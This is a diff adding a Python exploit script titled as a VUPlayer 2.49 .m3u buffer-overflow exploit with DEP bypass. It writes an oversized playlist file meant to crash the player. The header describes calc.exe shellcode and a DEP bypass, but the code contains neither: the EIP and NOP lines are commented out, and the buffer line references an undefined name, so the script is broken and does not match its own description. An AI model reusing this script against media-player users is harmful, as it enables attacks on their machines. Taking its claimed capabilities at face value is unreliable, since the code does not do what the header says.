@@ -1,0 +1,32 @@
+#!/usr/bin/env python
+#
+# Exploit Title: VUPlayer <=2.49 .M3u Buffer overflow exploit with DEP bypass
+# Date: 26-06-2016
+# Exploit Author: secfigo
+# Vendor Homepage: http://vuplayer.com/
+# Software Link: https://www.exploit-db.com/apps/39adeb7fa4711cd1cac8702fb163ded5-vuplayersetup.exe 
+# Version: VUPlayer <=2.49
+# Tested on: Windows 7 SP1 DEP=alwayson
+# Greetz: Raghu, nullSingapore
+###################################################################################
+
+
+import struct
+
+###################################################################################
+# Shellcode
+# windows/exec CMD=calc.exe with size 227 and bad characters "\x00\x09\x0a\x0d\x1a"
+###################################################################################
+
+
+#eip = 1
+
+#nops ="\x90"* 16
+
+buffer = A*2000
+
+print "[+] Creating .m3u file of size "+ str(len(buffer))
+file = open('vuplayer-dep.m3u','w');
+file.write(buffer);
+file.close();
+print "[+] Done creating the file"
